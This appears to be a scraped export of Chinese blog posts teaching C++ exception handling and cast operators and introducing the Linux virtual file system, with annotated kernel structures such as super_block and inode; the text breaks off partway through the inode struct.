如果一个函数抛出了它的异常接口声明所不允许抛出的异常，unexcepted函数会被调用，该函数默认行为调用terminate 函数中断程序 1234567891011121314151617181920212223242526272829303132333435#include&lt;iostream&gt;using namespace std;//可以抛出所有类型异常void TestFunction01()&#123; throw 10;&#125;//只能抛int char char*类型异常void TestFunction02() throw(int, char, char)&#123; string exception = &quot;error!&quot;; throw exception;&#125;//不能抛出任何类型异常void TestFunction03()throw()&#123; throw 10;&#125;int main()&#123; try &#123; TestFunction01(); TestFunction02(); TestFunction03(); &#125; catch (...) &#123; cout &lt;&lt; &quot;捕获异常！&quot; &lt;&lt; endl; &#125;&#125; 异常变量的生命周期123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;using namespace std;class MyException&#123;public: MyException() &#123; cout &lt;&lt; &quot;MyException默认构造函数调用&quot; &lt;&lt; endl; &#125; MyException(const MyException &amp;e) &#123; cout &lt;&lt; &quot;MyException拷贝构造函数调用&quot; &lt;&lt; endl; &#125; ~MyException() &#123; cout &lt;&lt; &quot;MyException析构函数调用&quot; &lt;&lt; endl; &#125;&#125;;void doWork()&#123; throw MyException();&#125;void test01()&#123; try &#123; doWork(); &#125; //抛出的是throw MyException;catch(MyException e)调用拷贝构造函数 效率低 //抛出的是throw MyException();catch(MyException &amp;e)只调用默认构造函数 效率高 //抛出的是throw &amp;MyException();catch(MyException *e)对象会提前释放掉，不能在非法操作 //抛出的是new MyException();catch(MyException *e)只调用默认构造函数 自己要管理释放 catch (MyException &amp;e) &#123; cout &lt;&lt; &quot;自定义异常捕获&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; test01();&#125; 异常的多态使用 提供基类异常类 class BaseException 纯虚函数 virtual void printError() &#x3D; 0 子类空指针异常和越界异常继承BaseException 重写virtual void printError() 测试，利用父类的引用指向子类对象 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;iostream&gt;using namespace std;//异常的基类class BaseException&#123;public: virtual void printError() = 0;&#125;;//空指针异常class NULLPointerException:public BaseException&#123;public: virtual void printError() &#123; cout &lt;&lt; &quot;空指针异常&quot; &lt;&lt; endl; &#125;&#125;;//越界异常class OutofRangeException :public BaseException&#123;public: virtual void printError() &#123; cout &lt;&lt; &quot;越界异常&quot; &lt;&lt; endl; &#125;&#125;;void doWork()&#123; //throw OutofRangeException(); throw NULLPointerException();&#125;void test01()&#123; try &#123; doWork(); &#125; catch (BaseException&amp; e) &#123; e.printError(); &#125;&#125;int main()&#123; test01();&#125; 运行结果为： 空指针异常 C++标准异常库标准库介绍标准库也提供了很多的异常类，它们是通过类继承组织起来的，异常类继承层级结构图如下： 每个类所在的头文件在图下方标识出来。 标准异常类的成员： 在上述继承体系中，每个类都有提供了构造函数、复制构造函数和复制操作符重载。 logic_error类及其子类、runtime_error类，及其子类，它们的构造函数时接受一个string类型的形式参数，用于异常信息的描述。 所有的异常类都有一个what()方法，返回const char*类型（C风格字符串）的值，描述异常信息。 标准异常类的具体描述： 异常名称 描述 exception 所有标准异常类的父类 bad_alloc 当operator new and operator new[]，请求分配内存失败时 bad_exception 这是个特殊的异常，如果函数的异常抛出列表里声明了bad_exception异常，当函数内部抛出了异常抛出列表中没有的异常，这是调用的Unexcepted函数中若抛出异常，不论什么类型，都会被替换为bad_exception类型 bad_typeid 使用typeid操作符，操作一个NULL指针，而该指针是带有虚函数的类，这时抛出bad_typeid异常 bad_cast 使用dynamic_cast转换引用失败的时候 ios_base::failure io操作过程出现错误 logic_error 逻辑错误，可以在运行前检测的错误 runtime_error 运行时错误，仅在运行时才可以检测的错误 logic_error的子类： 异常名称 描述 length_error 试图生成一个超出该类型最大长度的对象时，例如vector的resize操作 domain_error 参数的值域错误，主要用在数学函数中。例如使用一个负值调用只能操作非负数的函数 out_of_range 超出有效范围 invalid_argument 参数不合适。在标准库中，当利用string对象构造bitset时，而string中的字符不是0或1的时候，抛出该异常 runtime_error的子类： 异常名称 描述 range_error 计算结果超过了有意义的值域范围 overflow_error 算术计算上溢 underflow_error 算术计算下溢 invalid_argument 参数不合适。在标准库中，当利用string对象构造bitset，而string中的字符不是0或1的时候，抛出该异常 123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;stdexcept&gt;using namespace std;class Person&#123;public: Person(int age) &#123; if (age &lt; 0 || age&gt;150) &#123; throw out_of_range(&quot;年龄必须在0-150之间&quot;); &#125; this-&gt;m_Age = age; &#125; int m_Age;&#125;;void test01()&#123; try &#123; Person p(151); &#125; //catch (out_of_range&amp; e) catch(exception &amp;e) &#123; cout &lt;&lt; e.what() &lt;&lt; endl; &#125;&#125;int main()&#123; test01();&#125; 引入头文件 #include&lt;stdexcept&gt; 抛出越界异常throw out_of_range(&quot;...&quot;) 获取错误信息catch(exception &amp;e) e.what(); 编写自己的异常类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;iostream&gt;#include&lt;stdexcept&gt;using namespace std;class MyOutOfRangeException :public exception&#123;public: MyOutOfRangeException(const char* str) &#123; //const char *可以隐式类型转换为string，反之不可以 this-&gt;m_errorInfo = str; &#125; MyOutOfRangeException(string str) &#123; this-&gt;m_errorInfo = str; &#125; virtual const char* what() const &#123; //将string转为const char* return m_errorInfo.c_str(); &#125; string m_errorInfo;&#125;;class Person&#123;public: Person(int age) &#123; if (age &lt; 0 || age&gt;150) &#123; throw MyOutOfRangeException(&quot;年龄必须在0-150之间&quot;); &#125; this-&gt;m_Age = age; &#125; int m_Age;&#125;;void test01()&#123; try &#123; Person p(151); &#125; catch (MyOutOfRangeException&amp; e) &#123; cout &lt;&lt; e.what() &lt;&lt; endl; &#125;&#125;int main()&#123; test01();&#125; 编写MyOutOfRange继承Exception 重写virtual const char * what() const 将string转为const char *","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[]},{"title":"C++学习 类型转换","slug":"C++-学习-类型转换","date":"2023-06-30T10:04:47.000Z","updated":"2023-07-01T01:42:54.263Z","comments":true,"path":"2023/06/30/C++-学习-类型转换/","link":"","permalink":"http://example.com/2023/06/30/C++-%E5%AD%A6%E4%B9%A0-%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","excerpt":"类型转换(cast)是一种数据类型转换成另一种数据类型。例如，如果将一个整型值赋给一个浮点类型的变量，编译器会暗地里将其转换成浮点类型。 转换是非常有用的，但是它也会带来一些问题，比如在转换指针时，我们很可能将其转换成一个比它更大的类型，但这可能会破坏其他的数据。 应该小心类型转换，因为转换也就相当于对编译器说：忘记类型检查，把他看作其他的类型。","text":"类型转换(cast)是一种数据类型转换成另一种数据类型。例如，如果将一个整型值赋给一个浮点类型的变量，编译器会暗地里将其转换成浮点类型。 转换是非常有用的，但是它也会带来一些问题，比如在转换指针时，我们很可能将其转换成一个比它更大的类型，但这可能会破坏其他的数据。 应该小心类型转换，因为转换也就相当于对编译器说：忘记类型检查，把他看作其他的类型。 一般情况下，尽量少的去使用类型转换，除非用来解决非常特殊的问题。 无论什么原因，任何一个程序如果使用很多类型转换都值得怀疑。 标准C++提供了一个显示的转换的语法，来替代旧的C风格的类型转换。 使用C风格的强制转换可以把想要的任何东西转换成我们需要的类型，那为什么还需要一个新的C++类型的强制转换呢？ 新类型的强制转换可以提供给更好的控制强制转换过程，允许控制各种不同种类的强制转换。C++风格的强制转换其他的好处是，它们能更清晰的表明它们要干什么。程序员只要扫一眼这样的代码，就能立即知道一个强制转换的目的。 静态转换（static_cast） 用于类层次结构中基类（父类）和派生类（子类）之间指针或引用的转换。 进行上行转换（把派生类的指针或引用转换成基类表示)是安全的。 进行下行转换（把基类指针或引用转换成派生类表示）时，由于没有动态类型检查，所以是不安全的。 用于基本数据类型之间的转换，如把int转换成char，把char转换成int。这种转换的安全性也要开发人员来保证。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;using namespace std;//1、静态类型转换 static_castvoid test01()&#123; //允许内置的数据类型之间的转换 char a = &#x27;a&#x27;; double d = static_cast&lt;double&gt;(a); cout &lt;&lt; d &lt;&lt; endl;&#125;class Base &#123;&#125;;class Son : public Base&#123;&#125;;class Other&#123;&#125;;void test02()&#123; Base* base = NULL; Son* son = NULL; //语法： static_cast&lt;目标类型&gt;(原对象) // //父子之间的指针或者引用可以转换 //将base转为Son* 父转子 向下类型转换 不安全 Son* son2 = static_cast&lt;Son*&gt;(base); //son转为Base* 子转父 向上类型转换 安全 Base* base2 = static_cast&lt;Base*&gt;(son); //base转为Other* //没有父子关系，转换无效 Other* other = static_cast&lt;Other*&gt;(base);&#125;int main()&#123; test01(); test02();&#125; 动态转换(dynamic_cast) dynamic_cast主要用于类层次的上行转换和下行转换 在类层次间进行上行转换时，dynamic_cast和static_cast的效果是一样的 在进行下行转换时，dynamic_cast具有类型检查的功能，比static_cast更安全 不允许内置数据类型转换 允许父子之间指针或者引用的转换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;iostream&gt;using namespace std;//1、静态类型转换 static_castvoid test01()&#123; //允许内置的数据类型之间的转换 char a = &#x27;a&#x27;; double d = static_cast&lt;double&gt;(a); cout &lt;&lt; d &lt;&lt; endl;&#125;class Base &#123; virtual void func() &#123;&#125; &#125;;class Son : public Base &#123; virtual void func() &#123;&#125; &#125;;class Other&#123;&#125;;void test02()&#123; Base* base = NULL; Son* son = NULL; //语法： static_cast&lt;目标类型&gt;(原对象) // //父子之间的指针或者引用可以转换 //将base转为Son* 父转子 向下类型转换 不安全 Son* son2 = static_cast&lt;Son*&gt;(base); //son转为Base* 子转父 向上类型转换 安全 Base* base2 = static_cast&lt;Base*&gt;(son); //base转为Other* //没有父子关系，转换无效 //Other* other = static_cast&lt;Other*&gt;(base);&#125;//2、动态类型转换 dynamic_castvoid test03()&#123; //不允许内置数据类型之间的转换 //char c = &#x27;c&#x27;; //double d = dynamic_cast&lt;double&gt;(c);&#125;void test04()&#123; Base* base = new Son; Son* son = NULL; //将base转为Son * 父转子 不安全 转换无效 如果发生了多态，那么转换总是安全的 Son* son2 = dynamic_cast&lt;Son*&gt;(base); //son转为Base* 子转父 安全 Base* base2 = dynamic_cast&lt;Base*&gt;(son); //base转Other* 转换无效 //Other* other = dynamic_cast&lt;Other*&gt;(base);&#125;int main()&#123; test01(); test02(); test03(); test04();&#125; 常量转换(const_cast)该运算符用来修改类型的const属性 常量指针被转化成非常量指针，并且仍然指向原来的对象 常量引用被转换成非常量引用，并且仍然指向原来的对象 不能直接对非指针和非引用的变量使用const_cast操作符去直接移除它的cosnt 1234567891011121314151617181920212223242526#include&lt;iostream&gt;using namespace std;//常量转换void test()&#123; //不可以将非指针或者非引用做const_cast转换 const int* p = NULL; int *pp = const_cast&lt;int*&gt;(p); const int * ppp = const_cast&lt;const int*&gt;(pp); //const int a = 10; //int b = const_cast&lt;int&gt;(a); int num = 10; int&amp; numRef = num; const int&amp; num2 = const_cast&lt;const int&amp;&gt;(numRef);&#125;int main()&#123; test();&#125; 重新解释转换(reinterpret_cast)这是最不安全的一种转换机制，最有可能出问题。 主要用于将一种数据类型从一种类型转换为另一种类型。它可以将一个指针转换成一个整数，也可以将一个整数转换成一个指针。 12345678910111213141516171819202122#include&lt;iostream&gt;using namespace std;class Base &#123; virtual void func() &#123;&#125; &#125;;class Son : public Base &#123; virtual void func() &#123;&#125; &#125;;class Other &#123;&#125;;//重新解释转换 reinterpret_cast最不安全的一种转换，不建议使用void test()&#123; int a = 10; int* p = reinterpret_cast&lt;int*&gt;(a); Base* base = NULL; //base转Other* Other* other = reinterpret_cast&lt;Other*&gt;(base);&#125;int main()&#123; test();&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[]},{"title":"学习 Linux VFS虚拟文件系统 简介","slug":"学习-Linux-VFS虚拟文件系统","date":"2023-06-17T07:02:34.000Z","updated":"2023-12-15T06:54:37.442Z","comments":true,"path":"2023/06/17/学习-Linux-VFS虚拟文件系统/","link":"","permalink":"http://example.com/2023/06/17/%E5%AD%A6%E4%B9%A0-Linux-VFS%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"简介虚拟文件系统 （VFS） 或虚拟文件系统交换机是更具体的文件系统之上的抽象层。VFS 的目的是允许客户端应用程序以统一的方式访问不同类型的具体文件系统。例如，VFS 可用于透明地访问本地和网络存储设备，而客户端应用程序不会注意到差异。 即对于应用程序透明。它可用于弥Windows，经典Mac OS &#x2F; macOS和Unix文件系统之间的差异，以便应用程序可以访问这些类型的本地文件系统上的文件，而不必知道它们正在访问的文件系统类型。 VFS 指定内核和具体文件系统之间的接口（或“协定”）。因此，只需履行协定即可轻松地向内核添加对新文件系统类型的支持。","text":"简介虚拟文件系统 （VFS） 或虚拟文件系统交换机是更具体的文件系统之上的抽象层。VFS 的目的是允许客户端应用程序以统一的方式访问不同类型的具体文件系统。例如，VFS 可用于透明地访问本地和网络存储设备，而客户端应用程序不会注意到差异。 即对于应用程序透明。它可用于弥Windows，经典Mac OS &#x2F; macOS和Unix文件系统之间的差异，以便应用程序可以访问这些类型的本地文件系统上的文件，而不必知道它们正在访问的文件系统类型。 VFS 指定内核和具体文件系统之间的接口（或“协定”）。因此，只需履行协定即可轻松地向内核添加对新文件系统类型的支持。 为了让添加新的文件系统更加容易，并且提供一个通用（generic）的文件API，VFS，一个虚拟文件系统层被加到了linux内核中。 而对于EXT2这样的真实（real）文件系统，是去调用VFS API的。新的文件系统和新类型的存储介质都能找到进入Linux之路，程序无需重写，甚至无需重新编译。 在同一个目录结构中, 可以挂载着若干种不同的文件系统. VFS隐藏了它们的实现细节, 为使用者提供统一的接口; 目录结构本身并不是绝对的, 每个进程可能会看到不一样的目录结构. 目录结构是由”地址空间(namespace)”来描述的, 不同的进程可能拥有不同的namespace, 不同的namespace可能有着不同的目录结构(因为它们可能挂载了不同的文件系统)。 VFS层次结构操作文件的本质是将磁盘文件数据映射到进程中。在这个过程中，涉及以下几个关键步骤： 进程发出文件操作命令：当一个进程需要操作文件时，它会通过系统调用（如sys_open，sys_read，sys_write等）将请求传递给内核。系统调用是用户态进程与内核态代码之间的接口，用户态进程不能直接访问内核态资源，因此通过系统调用请求内核完成相应的操作。 VFS系统调用open（2)、stat（2）、read（2）、write（2）、chmod（2）等都是从进程上下文调用的。 内核数据结构的创建和维护：当内核收到进程的文件操作请求后，会为进程打开的文件和系统文件创建相应的数据结构。主要的数据结构包括： 文件描述符（file descriptor）：一个非负整数，用于唯一标识进程中打开的文件。 文件对象（file object）：在内核中，文件对象与文件描述符关联，存储文件的元数据（如文件位置、访问权限等）。 inode：表示文件在磁盘上的元数据，包括文件类型、大小、权限、时间戳等。 dentry：缓存目录项的数据结构，用于快速查找文件系统中的文件。 虚拟文件系统（VFS）：虚拟文件系统是一种文件系统抽象层，用于统一不同类型的文件系统和I&#x2F;O设备（如磁盘、管道、进程间通信、网络等）的接口。通过VFS，内核可以在不同的文件系统和设备之间提供统一的文件操作接口。 实现虚拟文件系统和实际文件系统的挂载：在VFS层之下，还有诸如ext4、FAT32等各种具体的文件系统实现。这些文件系统通过实现VFS定义的接口与VFS层进行交互。当一个文件系统被挂载到操作系统时，VFS会将文件系统的相关操作映射到对应的实现。 设备驱动接口和缓存：为了与不同类型的硬件设备进行交互，内核提供了设备驱动接口。设备驱动程序负责将文件系统的操作转换为特定硬件设备可以识别的指令。此外，内核还通过缓存技术来加快文件读写的速度。常见的缓存方式有页缓存（page cache）和缓冲区缓存（buffer cache）。 通用文件模型由对象组成：超级块对象、索引节点对象、目录项对象、文件对象。 VFS实现VFS数据结构图示是旧版本的VFS实现 三个不同进程已打开同一个文件，其中两个进程使用同一个硬链接。在这种情况下，每个进程都使用自己的文件对象，但只需要两个目录项对象，每个硬链接对应一个目录项对象。这两个目录项对象指向同一个索引节点对象，这个索引节点对象标识的是超级块对象以及普通磁盘文件。 VFS除了能为所有文件系统的实现提供一个通用接口外，它还具有另一个重要的作用，即提高系统性能。最近最常使用的目录项对象被放在所谓目录项高速缓存（dentry cache）的磁盘高速缓存中，以加速从文件路径名到最后一个路径分量的索引节点的转换过程。 inode是内核选择用于表示文件内容和相关元数据的方法。理论上，实现这个概念只需要一个数据结构（尽管很长），其中包含了所有必要的数据。实际上，数据分散到一系列较小的、布局清晰的结构中。 超级块super_block存放系统当中已安装文件系统有关信息。对于基于磁盘的文件系统，这类对象通常对应存放在磁盘上的文件系统控制块（每个文件系统都有一个超级块对象）。 是一个全局的数据结构，不管是什么文件系统都有超级块。VFS也有超级块。 fs.h - include&#x2F;linux&#x2F;fs.h - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134struct super_block &#123;//文件系统的整体信息成员如下： struct list_head s_list; /* Keep this first */ //用来将所有超级块实例连接到全局链表super_blocks,指向超级快链表的指针 dev_t s_dev; /* search index; _not_ kdev_t */ //保存文件系统所在的块设备，s_dev保存设备具体文件系统的块设备标识符：/dev/hda1等 unsigned char s_blocksize_bits; //块大小的值所占用的位数 unsigned long s_blocksize; //文件系统中数据库的大小，以字节为单位 loff_t s_maxbytes; /* Max file size */ //文件最大长度 struct file_system_type *s_type; //指向文件系统类型file_system_type数据结构的指针 const struct super_operations *s_op; //指向特定文件系统用于超级快的函数的集合 const struct dquot_operations *dq_op; //指向特定文件系统用于限额操作的函数集合 const struct quotactl_ops *s_qcop; const struct export_operations *s_export_op; unsigned long s_flags; unsigned long s_iflags; /* internal SB_I_* flags */ unsigned long s_magic; struct dentry *s_root; //指向根目录的结构体dentry，将超级块与全局根目录的dentry项关联起来 struct rw_semaphore s_umount; //对超级快读写时进行同步 int s_count; //对超级快的使用计数 atomic_t s_active;#ifdef CONFIG_SECURITY void *s_security;#endif const struct xattr_handler **s_xattr;#ifdef CONFIG_FS_ENCRYPTION const struct fscrypt_operations *s_cop; struct fscrypt_keyring *s_master_keys; /* master crypto keys in use */#endif#ifdef CONFIG_FS_VERITY const struct fsverity_operations *s_vop;#endif#if IS_ENABLED(CONFIG_UNICODE) struct unicode_map *s_encoding; __u16 s_encoding_flags;#endif struct hlist_bl_head s_roots; /* alternate root dentries for NFS */ struct list_head s_mounts; /* list of mounts; _not_ for fs use */ struct block_device *s_bdev; struct backing_dev_info *s_bdi; struct mtd_info *s_mtd; struct hlist_node s_instances; unsigned int s_quota_types; /* Bitmask of supported quota types */ struct quota_info s_dquot; /* Diskquota specific options */ struct sb_writers s_writers; /* * Keep s_fs_info, s_time_gran, s_fsnotify_mask, and * s_fsnotify_marks together for cache efficiency. They are frequently * accessed and rarely modified. */ void *s_fs_info; /* Filesystem private info */ /* Granularity of c/m/atime in ns (cannot be worse than a second) */ u32 s_time_gran; /* Time limits for c/m/atime in seconds */ time64_t s_time_min; time64_t s_time_max;#ifdef CONFIG_FSNOTIFY __u32 s_fsnotify_mask; struct fsnotify_mark_connector __rcu *s_fsnotify_marks;#endif char s_id[32]; /* Informational name */ uuid_t s_uuid; /* UUID */ unsigned int s_max_links; fmode_t s_mode; /* * The next field is for VFS *only*. No filesystems have any business * even looking at it. You had been warned. */ struct mutex s_vfs_rename_mutex; /* Kludge */ /* * Filesystem subtype. If non-empty the filesystem type field * in /proc/mounts will be &quot;type.subtype&quot; */ const char *s_subtype; const struct dentry_operations *s_d_op; /* default d_op for dentries */ struct shrinker s_shrink; /* per-sb shrinker handle */ /* Number of inodes with nlink == 0 but still referenced */ atomic_long_t s_remove_count; /* * Number of inode/mount/sb objects that are being watched, note that * inodes objects are currently double-accounted. */ atomic_long_t s_fsnotify_connectors; /* Being remounted read-only */ int s_readonly_remount; /* per-sb errseq_t for reporting writeback errors via syncfs */ errseq_t s_wb_err; /* AIO completions deferred from interrupt context */ struct workqueue_struct *s_dio_done_wq; struct hlist_head s_pins; /* * Owning user namespace and default context in which to * interpret filesystem uids, gids, quotas, device nodes, * xattrs and security labels. */ struct user_namespace *s_user_ns; /* * The list_lru structure is essentially just a pointer to a table * of per-node lru lists, each of which has its own spinlock. * There is no need to put them into separate cachelines. */ struct list_lru s_dentry_lru; struct list_lru s_inode_lru; struct rcu_head rcu; struct work_struct destroy_work; struct mutex s_sync_lock; /* sync serialisation lock */ /* * Indicates how deep in a filesystem stack this SB is */ int s_stack_depth; /* s_inode_list_lock protects s_inodes */ spinlock_t s_inode_list_lock ____cacheline_aligned_in_smp; struct list_head s_inodes; /* all inodes */ spinlock_t s_inode_wblist_lock; struct list_head s_inodes_wb; /* writeback inodes */&#125; __randomize_layout; s_root将超级块与全局根目录的dentry项关联起来。只有通常可见的文件系统的超级块，才指向&#x2F;（根）目录的dentry实例。具有特殊功能、不出现在通常的目录层次结构中的文件系统（例如，管道或套接字文件系统），指向专门的项，不能通过普通的文件命令访问。 处理文件系统对象的代码经常需要检查文件系统是否已经装载，而s_root可用于该目的。如果它为NULL，则该文件系统是一个伪文件系统，只在内核内部可见。否则，该文件系统在用户空间中是可见的。 所有超级快对象是以双向环形链表形式进行链接在一起。链表中第一个元素和最后一个元素的地址分别存放在super_blocks变量的s_list/next/prev域中 。 types.h - include&#x2F;linux&#x2F;types.h - Linux source code (v6.3.8) - Bootlin 123struct list_head &#123; struct list_head *next, *prev;&#125;; 具体架构如下： 尽管每个文件系统在file_system_type中只出现一次，但在所有超级块实例的链表中，可能有几个同一文件系统类型的超级块实例，因为在各个块设备&#x2F;分区上可能存储了同一类型的几个文件系统。例如，大多数系统都有root和home分区，二者可能在不同的分区上，但通常使用相同类型的文件系统。在file_system_type中，同一文件系统类型只需定义一次，但这两个装载点的超级块不同，虽然都使用了同样的文件系统。 超级块结构的一个重要成员是一个列表，包括相关文件系统中所有修改过的inode（内核相当不敬地称之为脏inode）。根据该列表很容易标识已经修改过的文件和目录，以便将其写回到存储介质。回写必须经过协调，保证在一定程度上最小化开销，因为这是一个非常费时的操作（硬盘、软盘驱动器及其他介质与系统其余组件相比，速度很慢）。另一方面，如果写回修改数据的间隔太长也可能有严重后果，因为系统崩溃（或者，就Linux的情形而言，更可能的是停电）会导致不能恢复的数据丢失。内核会周期性扫描脏块的列表，并将修改传输到底层硬件。 相关函数 sget sget identifier - Linux source code (v6.3.8) - Bootlin 构造函数，如果没有从已经挂载的文件系统找到需要的super_block 就会调用alloc_super分配一个 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// 定义 sget 函数struct super_block *sget(struct file_system_type *type, int (*test)(struct super_block *,void *), int (*set)(struct super_block *,void *), int flags, void *data)&#123; struct user_namespace *user_ns = current_user_ns(); // 获取当前用户命名空间 struct super_block *s = NULL; // 初始化超级块指针为空 struct super_block *old; // 定义一个用于存储找到的已存在超级块的指针 int err; // 定义一个错误变量 // 检查是否为子挂载，如果是，则将用户命名空间设置为初始用户命名空间 if (flags &amp; SB_SUBMOUNT) user_ns = &amp;init_user_ns;retry: // 重试标签，用于在需要时从此处重新开始执行 spin_lock(&amp;sb_lock); // 获取超级块锁，以防止并发问题 // 如果有 test 回调，那么遍历文件系统类型对应的超级块列表 if (test) &#123; hlist_for_each_entry(old, &amp;type-&gt;fs_supers, s_instances) &#123; // 如果 test 返回 0，继续遍历 if (!test(old, data)) continue; // 如果用户命名空间不匹配，解锁并销毁新创建的超级块，返回错误 if (user_ns != old-&gt;s_user_ns) &#123; spin_unlock(&amp;sb_lock); destroy_unused_super(s); return ERR_PTR(-EBUSY); &#125; // 如果成功获取已存在的超级块引用，跳转到重试标签 if (!grab_super(old)) goto retry; // 销毁新创建的超级块，并返回找到的已存在超级块 destroy_unused_super(s); return old; &#125; &#125; // 如果没有找到匹配的超级块，分配一个新的超级块 if (!s) &#123; spin_unlock(&amp;sb_lock); s = alloc_super(type, (flags &amp; ~SB_SUBMOUNT), user_ns); if (!s) return ERR_PTR(-ENOMEM); goto retry; &#125; // 使用 set 回调初始化新创建的超级块 err = set(s, data); if (err) &#123; spin_unlock(&amp;sb_lock); destroy_unused_super(s); return ERR_PTR(err); &#125; // 设置超级块的文件系统类型和标识符 s-&gt;s_type = type; strlcpy(s-&gt;s_id, type-&gt;name, sizeof(s-&gt;s_id)); // 将新创建的超级块添加到全局超级块列表和文件系统类型的超级块列表中 list_add_tail(&amp;s-&gt;s_list, &amp;super_blocks); hlist_add_head(&amp;s-&gt;s_instances, &amp;type-&gt;fs_supers); spin_unlock(&amp;sb_lock); // 释放超级块锁 get_filesystem(type); // 增加文件系统类型的引用计数 register_shrinker_prepared(&amp;s-&gt;s_shrink); // 注册超级块的缩减器 return s; // 返回新创建的超级块&#125;EXPORT_SYMBOL(sget); put_super put_super identifier - Linux source code (v6.3.8) - Bootlin 析构函数，当引用计数减少到0时才会调用destroy_super 真正释放 1234567// 定义 put_super 函数void put_super(struct super_block *sb)&#123; spin_lock(&amp;sb_lock); // 获取超级块锁，以防止并发问题 __put_super(sb); // 释放超级块的临时引用 spin_unlock(&amp;sb_lock); // 释放超级块锁&#125; super_operations主要包括对inode数据结构的操作，注意不是对inode的操作，对inode的操作由inode_operations来完成。如：alloc_inode、destroy_inode、dirty_inode等等。 还包括文件系统挂载和卸载等操作，如：sync_fs、statfs、remount_fs等等。 所有的函数由VFS调用，都在进程上下文调用，所有的函数都可能阻塞。 super_operations identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233struct super_operations &#123; struct inode *(*alloc_inode)(struct super_block *sb); void (*destroy_inode)(struct inode *); void (*free_inode)(struct inode *); void (*dirty_inode) (struct inode *, int flags); int (*write_inode) (struct inode *, struct writeback_control *wbc); int (*drop_inode) (struct inode *); void (*evict_inode) (struct inode *); void (*put_super) (struct super_block *); int (*sync_fs)(struct super_block *sb, int wait); int (*freeze_super) (struct super_block *); int (*freeze_fs) (struct super_block *); int (*thaw_super) (struct super_block *); int (*unfreeze_fs) (struct super_block *); int (*statfs) (struct dentry *, struct kstatfs *); int (*remount_fs) (struct super_block *, int *, char *); void (*umount_begin) (struct super_block *); int (*show_options)(struct seq_file *, struct dentry *); int (*show_devname)(struct seq_file *, struct dentry *); int (*show_path)(struct seq_file *, struct dentry *); int (*show_stats)(struct seq_file *, struct dentry *);#ifdef CONFIG_QUOTA ssize_t (*quota_read)(struct super_block *, int, char *, size_t, loff_t); ssize_t (*quota_write)(struct super_block *, int, const char *, size_t, loff_t); struct dquot **(*get_dquots)(struct inode *);#endif long (*nr_cached_objects)(struct super_block *, struct shrink_control *); long (*free_cached_objects)(struct super_block *, struct shrink_control *);&#125;; 索引节点inode存放关于具体文件的一些信息。对于基于磁盘的文件系统，此类对象通常对应用于存放在磁盘上的文件控制块（PCB）。每一个文件都有一个索引节点对象，每一个索引节点对象都有一个索引节点号，唯一标识文件系统中的一个文件。单个 dentry 通常有一个指向 inode 的指针。索引节点是文件系统对象，例如常规文件、目录、FIFO 。它们要么存在于光盘上（对于块设备文件系统），要么存在于内存中（对于伪文件系统）。 具体文件系统的索引节点是存储在磁盘上，是一种静态结构，我们要使用它，必须调入内存，填写VFS的索引节点（VFS索引节点是动态节点）。需要时，将位于光盘上的索引节点复制到内存中，并将对索引节点的更改写回磁盘，单个inode可以由多个dentry指向（例如，硬链接）。 要查找inode，需要VFS调用父目录inode的lookup（）方法。此方法由inode所在的特定文件系统实现安装。 VFS拥有所需的dentry以及inode，就可以open(2)打开文件，或者stat(2)查看inode数据。stat(2)的操作相当简单，VFS有了dentry，他就会查看inode数据，并将其中的一些数据传回用户空间。 inode identifier - Linux source code (v6.3.8) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107/* * Keep mostly read-only and often accessed (especially for * the RCU path lookup and &#x27;stat&#x27; data) fields at the beginning * of the &#x27;struct inode&#x27;*/struct inode &#123; umode_t i_mode; /* 文件类型和访问权限 */ unsigned short i_opflags; /* inode 操作标志 */ kuid_t i_uid; /* 文件拥有者的标识号，用户 ID */ kgid_t i_gid; /* 文件拥有者的所在组的标识号，组 ID */ unsigned int i_flags; /* 文件或目录的标志 */#ifdef CONFIG_FS_POSIX_ACL struct posix_acl *i_acl; /* 访问控制列表 (ACL) */ struct posix_acl *i_default_acl; /* 默认访问控制列表 */#endif const struct inode_operations *i_op; /* inode 操作函数集 */ struct super_block *i_sb; /* 指向此文件系统超级块的指针 */ struct address_space *i_mapping; /* 文件内容的内存映射 */#ifdef CONFIG_SECURITY void *i_security; /* 安全模块使用的 inode 信息 */#endif /* Stat data, not accessed from path walking */ unsigned long i_ino; /* inode 编号 */ union &#123;//与该节点建立链接的文件数量 const unsigned int i_nlink; /* 硬链接计数 */ unsigned int __i_nlink; &#125;; dev_t i_rdev; /* 实际设备标识号 */ loff_t i_size; /* 文件大小（字节） */ struct timespec64 i_atime; 